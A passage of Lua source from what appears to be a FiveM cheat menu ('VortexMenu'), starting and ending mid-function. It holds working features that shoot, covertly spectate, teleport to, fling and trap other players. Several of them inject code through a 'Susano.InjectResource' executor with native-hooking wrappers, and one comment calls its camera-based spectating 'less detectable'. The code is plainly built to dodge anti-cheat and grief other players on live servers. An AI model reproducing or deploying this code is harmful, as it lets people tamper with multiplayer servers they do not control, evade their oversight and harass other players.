        local playerPed = PlayerPedId()
        local currentWeapon = GetSelectedPedWeapon(playerPed)

        if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
            local weapons = {
                "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
            }

            for _, weaponName in ipairs(weapons) do
                local weaponHash = GetHashKey(weaponName)
                if HasPedGotWeapon(playerPed, weaponHash, false) then
                    currentWeapon = weaponHash
                    break
                end
            end

            if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                currentWeapon = GetHashKey("WEAPON_PISTOL")
            end
        end

        local targetCoords = GetEntityCoords(targetPed)
        local bodyCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z)
        local offsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.5, 0.0, 0.0)

        ShootSingleBulletBetweenCoords(
                    offsetCoords.x, offsetCoords.y, offsetCoords.z,
                    bodyCoords.x, bodyCoords.y, bodyCoords.z,
                    40, true, currentWeapon, playerPed, true, false, 1000.0
                )
            ]], targetServerId))
        else
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                return
            end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end

            local playerPed = PlayerPedId()
            local currentWeapon = GetSelectedPedWeapon(playerPed)

            if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                local weapons = {
                    "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                    "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                    "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                    "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                    "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                    "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                    "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                    "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                    "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                }

                for _, weaponName in ipairs(weapons) do
                    local weaponHash = GetHashKey(weaponName)
                    if HasPedGotWeapon(playerPed, weaponHash, false) then
                        currentWeapon = weaponHash
                        break
                    end
                end

                if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                    currentWeapon = GetHashKey("WEAPON_PISTOL")
                end
            end

            local targetCoords = GetEntityCoords(targetPed)
            local bodyCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z)
            local offsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.5, 0.0, 0.0)

            ShootSingleBulletBetweenCoords(
                offsetCoords.x, offsetCoords.y, offsetCoords.z,
                bodyCoords.x, bodyCoords.y, bodyCoords.z,
                40, true, currentWeapon, playerPed, true, false, 1000.0
            )
        end
    end,

    spectate = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer
        if targetServerId == GetPlayerServerId(PlayerId()) then
            return
        end

        vortex_spectateEnabled = not vortex_spectateEnabled

        if vortex_spectateEnabled then
            -- START spectate using camera-based method (less detectable than NetworkSetInSpectatorMode)
            vxSet('isSpectating', true)
            local me = PlayerPedId()
            local myCoords = GetEntityCoords(me)
            local myHeading = GetEntityHeading(me)

            rawset(_G, '_vortex_spec', {
                back = vector3(myCoords.x, myCoords.y, myCoords.z - 1.0),
                heading = myHeading,
                wasVisible = IsEntityVisible(me),
                targetSid = targetServerId,
                active = true,
                cam = nil
            })

            local clientId = GetPlayerFromServerId(targetServerId)
            if clientId == -1 then
                for _, pid in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(pid) == targetServerId then
                        clientId = pid
                        break
                    end
                end
            end

            local targetPed = (clientId ~= -1) and GetPlayerPed(clientId) or 0
            if clientId == -1 or targetPed == 0 or not DoesEntityExist(targetPed) then
                vortex_spectateEnabled = false
                vxSet('isSpectating', false)
                rawset(_G, '_vortex_spec', nil)
                return
            end

            local tCoords = GetEntityCoords(targetPed)
            RequestCollisionAtCoord(tCoords.x, tCoords.y, tCoords.z)

            SetEntityVisible(me, false, false)
            SetEntityCollision(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityAlpha(me, 0, false)

            local specCam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", tCoords.x, tCoords.y, tCoords.z + 2.0, -15.0, 0.0, 0.0, 60.0, false, 0)
            SetCamActive(specCam, true)
            RenderScriptCams(true, true, 500, true, true)

            rawset(_G, '_vortex_spec', {
                back = vector3(myCoords.x, myCoords.y, myCoords.z - 1.0),
                heading = myHeading,
                wasVisible = IsEntityVisible(me),
                targetSid = targetServerId,
                active = true,
                cam = specCam
            })

            Citizen.CreateThread(function()
                Citizen.Wait(100)
                if not rawget(_G, '_vortex_spec') or not rawget(_G, '_vortex_spec').active then return end

                local camDist = 6.0
                local camHeight = 2.5
                local smoothFactor = 0.08
                local camAngleH = 0.0
                local camAngleV = -12.0
                local lastCamPos = nil

                while rawget(_G, '_vortex_spec') and rawget(_G, '_vortex_spec').active do
                    local spec = rawget(_G, '_vortex_spec')
                    local sid = spec and spec.targetSid or targetServerId
                    local cam = spec and spec.cam

                    if not cam or not DoesCamExist(cam) then break end

                    local cid = GetPlayerFromServerId(sid)
                    if cid == -1 then
                        for _, pid in ipairs(GetActivePlayers()) do
                            if GetPlayerServerId(pid) == sid then cid = pid; break end
                        end
                    end
                    if cid == -1 then break end

                    local tPed = GetPlayerPed(cid)
                    if not tPed or tPed == 0 or not DoesEntityExist(tPed) then break end

                    local mouseX = GetDisabledControlNormal(0, 1) * 4.0
                    local mouseY = GetDisabledControlNormal(0, 2) * 4.0
                    camAngleH = camAngleH - mouseX
                    camAngleV = math.max(-60.0, math.min(30.0, camAngleV - mouseY))

                    if IsDisabledControlPressed(0, 241) then camDist = math.max(2.0, camDist - 0.5) end
                    if IsDisabledControlPressed(0, 242) then camDist = math.min(20.0, camDist + 0.5) end

                    local tc = GetEntityCoords(tPed)
                    RequestCollisionAtCoord(tc.x, tc.y, tc.z)

                    local radH = math.rad(camAngleH)
                    local radV = math.rad(camAngleV)
                    local idealPos = vector3(
                        tc.x + math.sin(radH) * math.cos(radV) * camDist,
                        tc.y + math.cos(radH) * math.cos(radV) * camDist,
                        tc.z + camHeight + math.sin(radV) * camDist
                    )

                    if lastCamPos then
                        idealPos = vector3(
                            lastCamPos.x + (idealPos.x - lastCamPos.x) * smoothFactor,
                            lastCamPos.y + (idealPos.y - lastCamPos.y) * smoothFactor,
                            lastCamPos.z + (idealPos.z - lastCamPos.z) * smoothFactor
                        )
                    end
                    lastCamPos = idealPos

                    SetCamCoord(cam, idealPos.x, idealPos.y, idealPos.z)
                    PointCamAtCoord(cam, tc.x, tc.y, tc.z + 0.5)

                    local hidePed = PlayerPedId()
                    local hidePos = vector3(tc.x + 50.0, tc.y + 50.0, tc.z - 50.0)
                    SetEntityCoordsNoOffset(hidePed, hidePos.x, hidePos.y, hidePos.z, false, false, false)
                    FreezeEntityPosition(hidePed, true)

                    DisableAllControlActions(0)
                    Citizen.Wait(0)
                end

                if rawget(_G, '_vortex_spec') and rawget(_G, '_vortex_spec').active then
                    vortex_spectateEnabled = false
                    vxSet('isSpectating', false)
                    local spec2 = rawget(_G, '_vortex_spec')
                    local p = PlayerPedId()
                    if spec2 and spec2.cam and DoesCamExist(spec2.cam) then
                        SetCamActive(spec2.cam, false)
                        DestroyCam(spec2.cam, true)
                    end
                    RenderScriptCams(false, true, 500, true, true)
                    FreezeEntityPosition(p, false)
                    if spec2 and spec2.back then
                        RequestCollisionAtCoord(spec2.back.x, spec2.back.y, spec2.back.z)
                        SetEntityCoords(p, spec2.back.x, spec2.back.y, spec2.back.z, false, false, false, true)
                    end
                    if spec2 and spec2.heading then SetEntityHeading(p, spec2.heading) end
                    SetEntityCollision(p, true, true)
                    SetEntityVisible(p, true, false)
                    SetEntityAlpha(p, 255, false)
                    ResetEntityAlpha(p)
                    SetEntityInvincible(p, false)
                    rawset(_G, '_vortex_spec', nil)
                end
            end)
        else
            -- STOP spectate
            vxSet('isSpectating', false)
            local spec = rawget(_G, '_vortex_spec')
            local me = PlayerPedId()

            if spec and spec.cam and DoesCamExist(spec.cam) then
                SetCamActive(spec.cam, false)
                DestroyCam(spec.cam, true)
            end
            RenderScriptCams(false, true, 500, true, true)

            FreezeEntityPosition(me, false)

            if spec then
                if spec.back then
                    RequestCollisionAtCoord(spec.back.x, spec.back.y, spec.back.z)
                    Citizen.CreateThread(function()
                        Citizen.Wait(200)
                        SetEntityCoords(PlayerPedId(), spec.back.x, spec.back.y, spec.back.z, false, false, false, true)
                    end)
                end
                if spec.heading then SetEntityHeading(me, spec.heading) end
                SetEntityCollision(me, true, true)
                SetEntityVisible(me, spec.wasVisible == nil and true or spec.wasVisible, false)
                SetEntityAlpha(me, 255, false)
                ResetEntityAlpha(me)
                SetEntityInvincible(me, false)
            end

            rawset(_G, '_vortex_spec', nil)
        end
    end,

    teleport = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer
        local teleportMode = VortexMenu.teleportMode

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleMaxNumberOfPassengers", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local teleportMode = "%s"

                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                if teleportMode == "player" then
                    local targetCoords = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(PlayerPedId(), targetCoords.x, targetCoords.y, targetCoords.z, false, false, false)
                elseif teleportMode == "vehicle" then
                    local veh = GetVehiclePedIsIn(targetPed, false)
                    if veh and veh ~= 0 then
                        local playerPed = PlayerPedId()
                        for seat = -1, GetVehicleMaxNumberOfPassengers(veh) - 1 do
                            if IsVehicleSeatFree(veh, seat) then
                                SetPedIntoVehicle(playerPed, veh, seat)
                                return
                            end
                        end
                    end
                end
            ]], targetServerId, teleportMode))
        else
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if VortexMenu.teleportMode == "player" then
            local targetCoords = GetEntityCoords(targetPed)
            SetEntityCoordsNoOffset(PlayerPedId(), targetCoords.x, targetCoords.y, targetCoords.z, false, false, false)
        elseif VortexMenu.teleportMode == "vehicle" then
            local veh = GetVehiclePedIsIn(targetPed, false)
            if veh and veh ~= 0 then
                local playerPed = PlayerPedId()
                for seat = -1, GetVehicleMaxNumberOfPassengers(veh) - 1 do
                    if IsVehicleSeatFree(veh, seat) then
                        SetPedIntoVehicle(playerPed, veh, seat)
                        return
                    end
                end
                end
            end
        end
    end,

    bugplayer = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer
        local bugPlayerMode = VortexMenu.bugPlayerMode or "bug"

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLocked", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLockedForAllPlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("DetachEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("AttachEntityToEntityPhysically", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerFromServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local bugPlayerMode = "%s"

                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                if bugPlayerMode == "bug" then
                    CreateThread(function()
                        local playerPed = PlayerPedId()
                        local myCoords = GetEntityCoords(playerPed)
                        local myHeading = GetEntityHeading(playerPed)

                        local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                        if not closestVeh or closestVeh == 0 then
                            return
                        end

                        local function tryEnterSeat(seatIndex)
                            SetPedIntoVehicle(playerPed, closestVeh, seatIndex)
                            Wait(0)
                            return IsPedInVehicle(playerPed, closestVeh, false) and GetPedInVehicleSeat(closestVeh, seatIndex) == playerPed
                        end

                        ClearPedTasksImmediately(playerPed)
                        SetVehicleDoorsLocked(closestVeh, 1)
                        SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

                        if IsVehicleSeatFree(closestVeh, -1) then
                            tryEnterSeat(-1)
                        end

                        Wait(150)

                        SetEntityAsMissionEntity(closestVeh, true, true)
                        if NetworkGetEntityIsNetworked(closestVeh) then
                            NetworkRequestControlOfEntity(closestVeh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                                NetworkRequestControlOfEntity(closestVeh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)

                        if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
                            return
                        end

                        for i = 1, 30 do
                            if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then break end
                            DetachEntity(closestVeh, true, true)
                            Wait(5)
                            AttachEntityToEntityPhysically(
                                closestVeh,
                                targetPed,
                                0, 0, 0,
                                1800.0, 1600.0, 1200.0,
                                300.0, 300.0, 300.0,
                                true, true, true, false, 0
                            )
                            Wait(5)
                        end
                    end)
                elseif bugPlayerMode == "launch" then
                    -- use safe launcher instead of physical attachment
                    Vortex_LaunchTarget(targetServerId)
                end
            ]], targetServerId, bugPlayerMode))
        else
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if VortexMenu.bugPlayerMode == "bug" then
        local wasSpectating = vortex_spectateEnabled
        if wasSpectating then
            local specData = rawget(_G, '_vortex_spec')
            if specData and specData.cam and DoesCamExist(specData.cam) then
                SetCamActive(specData.cam, false)
                RenderScriptCams(false, false, 0, true, true)
            end
            Citizen.Wait(100)
        end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
            if not closestVeh or closestVeh == 0 then
                return
            end

            local function tryEnterSeat(seatIndex)
                SetPedIntoVehicle(playerPed, closestVeh, seatIndex)
                Citizen.Wait(0)
                return IsPedInVehicle(playerPed, closestVeh, false) and GetPedInVehicleSeat(closestVeh, seatIndex) == playerPed
            end

            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(closestVeh, 1)
            SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

            if IsVehicleSeatFree(closestVeh, -1) then
                tryEnterSeat(-1)
            end

            Citizen.Wait(150)

            SetEntityAsMissionEntity(closestVeh, true, true)
            if NetworkGetEntityIsNetworked(closestVeh) then
                NetworkRequestControlOfEntity(closestVeh)
                local timeout = 0
                while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                    NetworkRequestControlOfEntity(closestVeh)
                    Citizen.Wait(10)
                    timeout = timeout + 1
                end
            end

            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
            SetEntityHeading(playerPed, myHeading)
            Citizen.Wait(100)

            if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
                return
            end

            for i = 1, 30 do
                if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then break end
                DetachEntity(closestVeh, true, true)
                Citizen.Wait(5)
                AttachEntityToEntityPhysically(
                    closestVeh,
                    targetPed,
                    0, 0, 0,
                    1800.0, 1600.0, 1200.0,
                    300.0, 300.0, 300.0,
                    true, true, true, false, 0
                )
                Citizen.Wait(5)
            end

            if wasSpectating then
                local spec = rawget(_G, '_vortex_spec')
                if spec and spec.active and spec.cam and DoesCamExist(spec.cam) then
                    SetCamActive(spec.cam, true)
                    RenderScriptCams(true, true, 500, true, true)
                end
            end
        end)
        elseif VortexMenu.bugPlayerMode == "launch" then
            local targetServerId = VortexMenu.selectedPlayer
            local radius = 3000.0

            Citizen.CreateThread(function()
                local clientId = GetPlayerFromServerId(targetServerId)
                if not clientId or clientId == -1 then
                    return
                end

                local targetPed = GetPlayerPed(clientId)
                if not targetPed or not DoesEntityExist(targetPed) then
                    return
                end

                local myPed = PlayerPedId()
                if not myPed then
                    return
                end

                local myCoords = GetEntityCoords(myPed)
                local targetCoords = GetEntityCoords(targetPed)
                if not myCoords or not targetCoords then
                    return
                end

                local distance = #(myCoords - targetCoords)
                local teleported = false
                local originalCoords = nil

                if distance > 10.0 then
                    originalCoords = myCoords
                    local angle = math.random() * 2 * math.pi
                    local radiusOffset = math.random(5, 9)
                    local xOffset = math.cos(angle) * radiusOffset
                    local yOffset = math.sin(angle) * radiusOffset
                    local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                    SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                    SetEntityVisible(myPed, false, 0)
                    teleported = true
                    Citizen.Wait(100)
                end

                ClearPedTasksImmediately(myPed)
                for i = 1, 5 do
                    if not DoesEntityExist(targetPed) then
                        break
                    end

                    local curTargetCoords = GetEntityCoords(targetPed)
                    if not curTargetCoords then
                        break
                    end

                    SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                    Citizen.Wait(100)
                    AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                    Citizen.Wait(100)
                    DetachEntity(myPed, true, true)
                    Citizen.Wait(200)
                end

                Citizen.Wait(500)
                ClearPedTasksImmediately(myPed)

                if originalCoords then
                    SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                    Citizen.Wait(100)
                    SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                end

                if teleported then
                    SetEntityVisible(myPed, true, 0)
                end
            end)
            end
        end
    end,

    blackhole = function()
        local currentState = rawget(_G, 'black_hole_active') or false

        if currentState then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if not _G.black_hole_active then
                        _G.black_hole_active = false
                    end
                    if not _G.black_hole_vehicles then
                        _G.black_hole_vehicles = {}
                    end
                    if not _G.black_hole_target_player then
                        _G.black_hole_target_player = nil
                    end
                    _G.black_hole_active = false
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = nil
                ]])
            else
            rawset(_G, 'black_hole_active', false)
            rawset(_G, 'black_hole_vehicles', {})
            rawset(_G, 'black_hole_target_player', nil)
            end
            return
        end

        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamActive", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityModel", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestModel", function(originalFn, ...) return originalFn(...) end)
                hNative("HasModelLoaded", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("CreatePed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetBlockingOfNonTemporaryEvents", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityLocallyInvisible", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetModelAsNoLongerNeeded", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameTimer", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)

                if not _G.black_hole_active then
                    _G.black_hole_active = false
                end
                if not _G.black_hole_vehicles then
                    _G.black_hole_vehicles = {}
                end
                if not _G.black_hole_target_player then
                    _G.black_hole_target_player = nil
                end
                if not _G.black_hole_last_scan then
                    _G.black_hole_last_scan = 0
                end

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    _G.black_hole_active = true
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = targetPlayerId

                    local blackHoleCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    SetCamCoord(blackHoleCam, camCoords.x, camCoords.y, camCoords.z)
                    SetCamRot(blackHoleCam, camRot.x, camRot.y, camRot.z, 2)
                    SetCamFov(blackHoleCam, GetGameplayCamFov())
                    SetCamActive(blackHoleCam, true)
                    RenderScriptCams(true, false, 0, true, true)

                    local playerModel = GetEntityModel(playerPed)
                    RequestModel(playerModel)
                    local timeout = 0
                    while not HasModelLoaded(playerModel) and timeout < 50 do
                        Wait(50)
